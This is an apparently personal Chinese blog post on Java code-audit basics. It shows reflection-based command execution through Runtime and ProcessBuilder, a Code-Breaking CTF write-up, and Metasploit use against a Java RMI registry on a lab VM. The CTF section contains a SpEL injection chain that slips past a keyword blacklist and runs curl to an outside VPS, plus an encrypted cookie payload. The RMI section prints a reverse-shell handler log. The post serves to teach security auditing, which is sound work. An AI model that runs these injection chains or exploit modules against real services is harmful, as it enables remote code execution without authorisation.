---
title: 'java代码审计基础'
date: 2019-10-04
updated: 2019-10-10
category: 'web'
tags:
  - 'java'
lang: 'zh'
draft: false
---
是时候开始研究java代码审计了

## 反射

通过反射可以使得java语言具有动态特性

### 通过java.lang.Runtime

反射利用的代码如下：

```java
public static void main(String[] args) throws ClassNotFoundException,NoSuchMethodException, IllegalAccessException, InvocationTargetException {
    Class clazz = Class.forName("java.lang.Runtime");
    clazz.getMethod("exec", String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz), "calc.exe");
}
```

> java.lang.Runtime遵循单例模式，也就是说构造方法是私有的、

查看其源码可以发现:

```java
/** Don't let anyone else instantiate this class */
private Runtime() {}
```

注释中特意写明了不要让任何人实例化这个类

```java
private static Runtime currentRuntime = new Runtime();

/**
 * Returns the runtime object associated with the current Java application.
 * Most of the methods of class <code>Runtime</code> are instance
 * methods and must be invoked with respect to the current runtime object.
 *
 * @return  the <code>Runtime</code> object associated with the current
 *          Java application.
 */
public static Runtime getRuntime() {
    return currentRuntime;
}
```

遵循单例模式所以就会有一个静态方法`getRuntime`

要实现反射执行`exec`，前面提到的`payload`可以分为几个部分

```java
//获取到java.lang.Runtime的class对象
Class clazz = Class.forName("java.lang.Runtime");
Method execMethod = clazz.getMethod("exec", String.class);
Method runtimeMethod = clazz.getMethod("getRuntime");
execMethod.invoke(runtimeMethod.invoke(clazz), "calc.exe");
```

注意每一个反射得来的方法`invoke`的时候第一个参数必须是对象

## ProcessBuilder的利用

```java
//顾名思义和StringBuilder又几分相似
Class clazz = Class.forName("java.lang.ProcessBuilder");
Method startMethod = clazz.getMethod("start");
startMethod.invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe")));
```

同样我们通过反射拿到`start`方法，然后调用的时候，由于第一个参数必须是该类的对象，所以我们通过`getConstructor`方法拿到它的构造方法之后实例化

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/java0.png)

## 反射例题

引用`code breaking`的一道题目

题目是一个登陆的页面，用户名和密码都是admin，登陆的时候可以勾选`remeber-me`选项

登录之后是一个hello页面

```java
@GetMapping
public String admin(@CookieValue(value = "remember-me", required = false) String rememberMeValue,HttpSession session,Model model) {
        if (rememberMeValue != null && !rememberMeValue.equals("")) {
            String username = userConfig.decryptRememberMe(rememberMeValue);
            if (username != null) {
                session.setAttribute("username", username);
            }
        }

        Object username = session.getAttribute("username");
        if(username == null || username.toString().equals("")) {
            return "redirect:/login";
        }

        model.addAttribute("name", getAdvanceValue(username.toString()));
        return "hello";
    }
```

勾选了`remember-me`之后，会从中解密得到`username`，然后将其传递给一个方法`getAdvanceValue`跟进这个方法：

```java
private String getAdvanceValue(String val) {
     for (String keyword: keyworkProperties.getBlacklist()) {
         Matcher matcher = Pattern.compile(keyword, Pattern.DOTALL | Pattern.CASE_INSENSITIVE).matcher(val);
         if (matcher.find()) {
             throw new HttpClientErrorException(HttpStatus.FORBIDDEN);
         }
     }

     ParserContext parserContext = new TemplateParserContext();
     Expression exp = parser.parseExpression(val, parserContext);
     SmallEvaluationContext evaluationContext = new SmallEvaluationContext();
     return exp.getValue(evaluationContext).toString();
 }
```

可以看到有一个黑名单，之后的几行代码是解析一个表达式并执行的

构造利用链:

```java
String.class.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",String.class).invoke(String.class.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(String.class.getClass().forName("java.l"+"ang.Ru"+"ntime")),"curl 39.106.125.244:8888"
```

就用它的那个类进行加密：

得到`payload`

```
VEdGePvYTXhp0TFlUTtEl9RimJGOGpGZmgTM181ZSAKn4ScdI0Z7KYgJhlMaf9ccTQkfOt9mgarInh090nWzls6IIWfW48Zkp8HC-rIyg6JtO-AMtI9O1NJYoSTFhcKdJqkg7VdFU-VG3b6vZrkJtwrj_i6Lv2-MBChAj5zXjZb7KGe6wnDO9NuYCGxQPgeADgBBME92fOaL3pOQp4Bte6O3gv0O3m6y09PwZ3jc-PMHalwzRzgR-M1svkqJushiOMCAj1i9rDZK3uOk1_CdFzQKq1to-MOwohuebk7d9NZRM_jWyG2fyJrqxJ6JPlquC7whDaz8Bz8gxXc2QYn2rrjhRZ0w5sn1IaRmg2DoPiel0OUd9LKMhxWDoLHZHu7X
```

利用效果：

VPS监听到了请求

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/JAVA3.png)

## RMI

### 一个探测的工具

![](/2019/10/04/java-dai-ma-shen-ji-ji-chu/rmi.png)

用`nmap`扫描可以发现这次的主角`Java RMI Registry`

![](/2019/10/04/java-dai-ma-shen-ji-ji-chu/assets/rmi2)

接下来可以使用`nmap`的脚本进行验证

```
$ nmap --script=rmi-vuln-classloader -p 1099 192.168.182.134
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-05 06:41 EDT
Nmap scan report for 192.168.182.134
Host is up (0.00041s latency).

PORT     STATE SERVICE
1099/tcp open  rmiregistry
| rmi-vuln-classloader: 
|   VULNERABLE:
|   RMI registry default configuration remote code execution vulnerability
|     State: VULNERABLE
|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
|       
|     References:
|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb
MAC Address: 00:0C:29:D9:A2:EA (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
```

主机是有漏洞的

msf上搜索java\_rmi的模块

```
msf5 > search java_rmi

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  auxiliary/gather/java_rmi_registry                               normal     No     Java RMI Registry Interfaces Enumeration
   1  auxiliary/scanner/misc/java_rmi_server          2011-10-15       normal     Yes    Java RMI Server Insecure Endpoint Code Execution Scanner
   2  exploit/multi/browser/java_rmi_connection_impl  2010-03-31       excellent  No     Java RMIConnectionImpl Deserialization Privilege Escalation
   3  exploit/multi/misc/java_rmi_server              2011-10-15       excellent  No     Java RMI Server Insecure Default Configuration Java Code Execution
```

检测到

```
msf5 auxiliary(scanner/misc/java_rmi_server) > exploit 

[+] 192.168.182.134:1099  - 192.168.182.134:1099 Java RMI Endpoint Detected: Class Loader Enabled
[*] 192.168.182.134:1099  - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

`Class Loader Enabled`

使用`java_rmi_server`进行攻击，但是并没有成功

```
msf5 exploit(multi/misc/java_rmi_server) > exploit 

[*] Started reverse TCP handler on 192.168.182.133:4444 
[*] 192.168.182.134:1099 - Using URL: http://0.0.0.0:8080/3KFzyXCBVe
[*] 192.168.182.134:1099 - Local IP: http://192.168.182.133:8080/3KFzyXCBVe
[*] 192.168.182.134:1099 - Server started.
[*] 192.168.182.134:1099 - Sending RMI Header...
[*] 192.168.182.134:1099 - Sending RMI Call...
[*] 192.168.182.134:1099 - Replied to request for payload JAR
[*] Sending stage (53845 bytes) to 192.168.182.134
[*] Meterpreter session 3 opened (192.168.182.133:4444 -> 192.168.182.134:35718) at 2019-10-05 06:47:47 -0400
[-] 192.168.182.134:1099 - Exploit failed: RuntimeError Timeout HTTPDELAY expired and the HTTP Server didn't get a payload request
[*] 192.168.182.134:1099 - Server stopped.
[*] Exploit completed, but no session was created.
```

## 参考

[Java RMI漏洞利用](https://www.4hou.com/web/15388.html)
